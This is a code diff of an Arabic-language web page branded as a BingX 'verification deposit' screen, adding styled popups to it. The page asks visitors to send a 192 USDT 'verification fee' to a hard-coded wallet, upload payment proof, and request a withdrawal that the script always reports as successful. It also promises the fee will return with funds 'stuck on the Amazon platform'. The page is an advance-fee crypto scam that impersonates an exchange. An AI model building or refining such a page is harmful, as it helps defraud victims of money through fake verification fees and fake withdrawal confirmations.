@@ -1,137 +1,180 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>التداول - اختبار الستايل</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <style>
-    :root{
-      --bg1:#0f2027;
-      --bg2:#203a43;
-      --accent:#f1c40f;
-      --btn-primary:#f1c40f;
-      --btn-ghost:#fff;
-    }
-    body{
-      background: linear-gradient(135deg,var(--bg1),var(--bg2));
-      color:#fff;
-      direction:rtl;
-      font-family:'Tajawal', sans-serif;
-      margin:0;
-      padding:0;
-    }
-    .container{max-width:600px;margin:20px auto;padding:10px;}
-    .brand{color:var(--accent); font-weight:700; font-size:20px;}
-    .card{background:rgba(255,255,255,0.05); padding:20px; border-radius:12px; box-shadow:0 8px 25px rgba(0,0,0,0.5); margin:12px 0;}
-    .btn{cursor:pointer; padding:8px 14px; border:none; border-radius:6px; font-size:14px; transition:0.2s;}
-    .btn:hover{opacity:0.9;}
-    .btn-primary{background:var(--btn-primary); color:#000; font-weight:600;}
-    .btn-ghost{background:transparent; color:var(--btn-ghost); border:1px solid #fff;}
-    .small-input{padding:6px 10px; border-radius:6px; border:none; width:100%; margin-top:4px;}
-    .wallet-row{display:flex; gap:12px; align-items:flex-start; flex-wrap:wrap;}
-    .muted{color:rgba(255,255,255,0.7); font-size:13px;}
-    .proof-name{margin-top:6px; font-size:13px; color:#f1c40f;}
-    hr{border:none; border-top:1px solid rgba(255,255,255,0.2);}
-  </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>التداول - نوافذ منبثقة احترافية</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+:root{
+  --bg1:#0f2027;
+  --bg2:#203a43;
+  --accent:#f1c40f;
+  --btn-primary:#f1c40f;
+  --btn-ghost:#fff;
+  --modal-bg:rgba(0,0,0,0.8);
+  --modal-card-bg:#1c2a36;
+}
+body{
+  background: linear-gradient(135deg,var(--bg1),var(--bg2));
+  color:#fff;
+  direction:rtl;
+  font-family:'Tajawal', sans-serif;
+  margin:0;
+  padding:0;
+}
+.container{max-width:600px;margin:20px auto;padding:10px;}
+.brand{color:var(--accent); font-weight:700; font-size:20px;}
+.card{background:rgba(255,255,255,0.05); padding:20px; border-radius:12px; box-shadow:0 8px 25px rgba(0,0,0,0.5); margin:12px 0;}
+.btn{cursor:pointer; padding:8px 14px; border:none; border-radius:6px; font-size:14px; transition:0.2s;}
+.btn:hover{opacity:0.9;}
+.btn-primary{background:var(--btn-primary); color:#000; font-weight:600;}
+.btn-ghost{background:transparent; color:var(--btn-ghost); border:1px solid #fff;}
+.small-input{padding:6px 10px; border-radius:6px; border:none; width:100%; margin-top:4px;}
+.wallet-row{display:flex; gap:12px; align-items:flex-start; flex-wrap:wrap;}
+.muted{color:rgba(255,255,255,0.7); font-size:13px;}
+.proof-name{margin-top:6px; font-size:13px; color:#f1c40f;}
+hr{border:none; border-top:1px solid rgba(255,255,255,0.2);}
+.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:var(--modal-bg);justify-content:center;align-items:center;z-index:1000;}
+.modal.active{display:flex;}
+.modal-content{background:var(--modal-card-bg);padding:20px;border-radius:10px;max-width:400px;width:90%;text-align:center;position:relative;animation:fadeIn 0.3s;}
+.modal-content h3{margin-top:0;color:var(--accent);}
+.modal-content i{margin-bottom:8px; font-size:28px;}
+.modal-close{position:absolute;top:10px;right:10px;background:none;border:none;color:#fff;font-size:18px;cursor:pointer;}
+@keyframes fadeIn{from{opacity:0; transform:translateY(-20px);}to{opacity:1; transform:translateY(0);}}
+.alert-note{background:#2c3e50; padding:10px; border-left:4px solid var(--accent); margin:10px 0; font-size:14px;}
+</style>
 </head>
 <body>
-  <div class="container">
-    <div class="header">
-      <div class="brand">BingX — إيداع التحقق</div>
-      <div><a class="link" href="index.html" style="color:#fff;text-decoration:underline;">العودة للرئيسية</a></div>
-    </div>
-
-    <div class="card">
-      <h3>إيداع التحقق</h3>
-      <p class="muted">
-        مرحباً — لإكمال عملية التحقق وحماية حسابك، يتطلب النظام رسوم تحقق مقدارها <strong>192 USDT</strong>.
-        الرجاء إرسال المبلغ إلى عنوان المحفظة أدناه ورفع إثبات الدفع لبدء المراجعة.
-      </p>
-
-      <div class="wallet-row">
-        <div style="flex:1">
-          <label>عنوان الإيداع (شبكة BEP20)</label>
-          <div class="wallet-address" id="deposit-address">0x3932890a5d1acb3ab036bd39ade26c47929b37e5</div>
-          <div class="muted">USDT - BEP20</div>
-        </div>
-        <div style="min-width:160px">
-          <label>نسخ العنوان</label><br>
-          <button class="btn btn-ghost small" onclick="copyDepositAddress()">📋 نسخ</button>
-        </div>
-      </div>
-
-      <hr/>
-
-      <h4>أرفق إثبات الإيداع</h4>
-      <p class="muted">ارفع صورة المعاملة (JPG/PNG). سيظهر اسم الملف هنا.</p>
-      <input id="proof-file" type="file" accept="image/*" />
-      <div id="proof-file-name" class="proof-name"></div>
-
-      <div style="margin-top:12px">
-        <button class="btn btn-primary" onclick="submitVerificationDeposit()">إرسال إثبات & طلب التحقق</button>
-        <button class="btn btn-ghost" onclick="clearVerificationForm()">مسح النموذج</button>
-      </div>
-
-      <p id="verify-msg" class="muted" style="margin-top:10px"></p>
-
-      <hr/>
-
-      <h4>طلب سحب بعد التحقق</h4>
-      <p class="muted">يمكنك طلب سحب المبلغ من حسابك بعد رفع إثبات الدفع.</p>
-
-      <div class="wallet-row">
-        <input id="withdraw-amount" type="number" placeholder="المبلغ المراد سحبه (USDT)" class="small-input"/>
-        <input id="withdraw-target-wallet" placeholder="عنوان محفظة السحب (BEP20)" class="small-input"/>
-      </div>
-
-      <div style="margin-top:10px">
-        <button class="btn btn-primary" onclick="requestWithdraw()">طلب السحب</button>
-      </div>
-
-      <p id="withdraw-msg" class="muted" style="margin-top:10px"></p>
-
-      <div class="muted note" style="margin-top:12px">
-        ملاحظة: إيداع التحقق سوف يعود لك مع أموالك العالقة في منصة أمازون
-      </div>
-    </div>
+<div class="container">
+  <div class="header">
+    <div class="brand">BingX — إيداع التحقق</div>
+    <div><a class="link" href="index.html" style="color:#fff;text-decoration:underline;">العودة للرئيسية</a></div>
   </div>
 
-  <script>
-    document.getElementById('proof-file')?.addEventListener('change', (e)=>{
-      const f = e.target.files[0];
-      document.getElementById('proof-file-name').innerText = f ? `ملف مرفوع: ${f.name}` : '';
-    });
+  <div class="card">
+    <h3>إيداع التحقق</h3>
+    <p class="muted">
+      مرحباً — لإكمال عملية التحقق وحماية حسابك، يتطلب النظام رسوم تحقق مقدارها <strong>192 USDT</strong>.
+      الرجاء إرسال المبلغ إلى عنوان المحفظة أدناه ورفع إثبات الدفع لبدء المراجعة.
+    </p>
 
-    function copyDepositAddress(){ 
-      const addr = document.getElementById('deposit-address')?.innerText || ''; 
-      if(addr) navigator.clipboard.writeText(addr).then(()=>alert('تم نسخ عنوان الإيداع')); 
-    }
+    <div class="wallet-row">
+      <div style="flex:1">
+        <label>عنوان الإيداع (شبكة BEP20)</label>
+        <div class="wallet-address" id="deposit-address">0x3932890a5d1acb3ab036bd39ade26c47929b37e5</div>
+        <div class="muted">USDT - BEP20</div>
+      </div>
+      <div style="min-width:160px">
+        <label>نسخ العنوان</label><br>
+        <button class="btn btn-ghost small" onclick="copyDepositAddress()">📋 نسخ</button>
+      </div>
+    </div>
 
-    function clearVerificationForm(){ 
-      document.getElementById('proof-file').value=''; 
-      document.getElementById('proof-file-name').innerText=''; 
-      document.getElementById('withdraw-wallet').value=''; 
-      document.getElementById('verify-amount').value='300'; 
-      document.getElementById('verify-msg').innerText=''; 
-    }
+    <hr/>
 
-    function submitVerificationDeposit(){
-      const fileInput = document.getElementById('proof-file');
-      const file = fileInput.files[0];
-      if(!file){ alert('يرجى إرفاق صورة إثبات الدفع'); return; }
-      document.getElementById('verify-msg').innerText = 'تم إرسال طلب التحقق — قيد المراجعة';
-    }
+    <h4>أرفق إثبات الإيداع</h4>
+    <p class="muted">ارفع صورة المعاملة (JPG/PNG). سيظهر اسم الملف هنا.</p>
+    <input id="proof-file" type="file" accept="image/*" />
+    <div id="proof-file-name" class="proof-name"></div>
 
-    function requestWithdraw(){
-      const amt = parseFloat(document.getElementById('withdraw-amount').value);
-      const wallet = document.getElementById('withdraw-target-wallet').value.trim();
-      if(isNaN(amt) || amt <= 0){ alert('أدخل مبلغ سحب صالح'); return; }
-      if(!wallet){ alert('أدخل عنوان محفظة السحب'); return; }
-      // الرسالة الجديدة عند السحب
-      alert(`تم السحب بنجاح.\nستصلك رسالة بريد إلكتروني.\nيرجى رفع صورة للأموال العالقة.`);
-      document.getElementById('withdraw-msg').innerText = 'تم السحب بنجاح';
-    }
-  </script>
+    <div style="margin-top:12px">
+      <button class="btn btn-primary" onclick="submitVerificationDeposit()">إرسال إثبات & طلب التحقق</button>
+      <button class="btn btn-ghost" onclick="clearVerificationForm()">مسح النموذج</button>
+    </div>
+
+    <p id="verify-msg" class="muted" style="margin-top:10px"></p>
+
+    <hr/>
+
+    <h4>طلب سحب بعد التحقق</h4>
+    <div class="alert-note">
+      ⚠️ قبل طلب السحب، يجب رفع صورة للأموال العالقة على المنصة
+    </div>
+
+    <p class="muted">يمكنك طلب سحب المبلغ من حسابك بعد رفع إثبات الدفع.</p>
+
+    <div class="wallet-row">
+      <input id="withdraw-amount" type="number" placeholder="المبلغ المراد سحبه (USDT)" class="small-input"/>
+      <input id="withdraw-target-wallet" placeholder="عنوان محفظة السحب (BEP20)" class="small-input"/>
+    </div>
+
+    <div style="margin-top:10px">
+      <button class="btn btn-primary" onclick="requestWithdraw()">طلب السحب</button>
+    </div>
+
+    <p id="withdraw-msg" class="muted" style="margin-top:10px"></p>
+    <div class="muted note" style="margin-top:12px">
+      ملاحظة: إيداع التحقق سوف يعود لك مع أموالك العالقة في منصة أمازون
+    </div>
+  </div>
+</div>
+
+<!-- نافذة منبثقة -->
+<div class="modal" id="modal">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeModal()">&times;</button>
+    <i id="modal-icon" class=""></i>
+    <h3 id="modal-title"></h3>
+    <p id="modal-text"></p>
+    <button class="btn btn-primary" onclick="closeModal()">حسناً</button>
+  </div>
+</div>
+
+<script>
+document.getElementById('proof-file')?.addEventListener('change', (e)=>{
+  const f = e.target.files[0];
+  document.getElementById('proof-file-name').innerText = f ? `ملف مرفوع: ${f.name}` : '';
+});
+
+function copyDepositAddress(){ 
+  const addr = document.getElementById('deposit-address')?.innerText || ''; 
+  if(addr) showModal('نسخ العنوان', 'تم نسخ عنوان الإيداع', 'success');
+}
+
+function clearVerificationForm(){ 
+  document.getElementById('proof-file').value=''; 
+  document.getElementById('proof-file-name').innerText=''; 
+  document.getElementById('withdraw-wallet')?.value=''; 
+  document.getElementById('verify-amount')?.value='300'; 
+  document.getElementById('verify-msg').innerText=''; 
+}
+
+function submitVerificationDeposit(){
+  const fileInput = document.getElementById('proof-file');
+  const file = fileInput.files[0];
+  if(!file){ showModal('خطأ', 'يرجى إرفاق صورة إثبات الدفع', 'error'); return; }
+  document.getElementById('verify-msg').innerText = 'تم إرسال طلب التحقق — قيد المراجعة';
+  showModal('تم الإرسال', 'تم إرسال طلب التحقق بنجاح، قيد المراجعة.', 'success');
+}
+
+function requestWithdraw(){
+  const amt = parseFloat(document.getElementById('withdraw-amount').value);
+  const wallet = document.getElementById('withdraw-target-wallet').value.trim();
+  if(isNaN(amt) || amt <= 0){ showModal('خطأ', 'أدخل مبلغ سحب صالح', 'error'); return; }
+  if(!wallet){ showModal('خطأ', 'أدخل عنوان محفظة السحب', 'error'); return; }
+  // يجب التحقق من رفع صورة الأموال العالقة (يمكنك إضافة شرط حقيقي حسب التطبيق)
+  const proofUploaded = document.getElementById('proof-file').files.length > 0;
+  if(!proofUploaded){ showModal('تحذير', 'يرجى رفع صورة للأموال العالقة قبل السحب', 'warning'); return; }
+  document.getElementById('withdraw-msg').innerText = 'تم السحب بنجاح';
+  showModal('تم السحب', 'تم السحب بنجاح.\nستصلك رسالة بريد إلكتروني.\nتم رفع صورة الأموال العالقة.', 'success');
+}
+
+// الدوال الخاصة بالـModal مع أيقونات
+function showModal(title, text, type){
+  const icon = document.getElementById('modal-icon');
+  if(type==='success'){ icon.className='fas fa-check-circle'; icon.style.color='#2ecc71'; }
+  else if(type==='error'){ icon.className='fas fa-times-circle'; icon.style.color='#e74c3c'; }
+  else if(type==='warning'){ icon.className='fas fa-exclamation-triangle'; icon.style.color='#f1c40f'; }
+  else { icon.className=''; }
+  document.getElementById('modal-title').innerText = title;
+  document.getElementById('modal-text').innerText = text;
+  document.getElementById('modal').classList.add('active');
+}
+
+function closeModal(){
+  document.getElementById('modal').classList.remove('active');
+}
+</script>
 </body>
 </html>
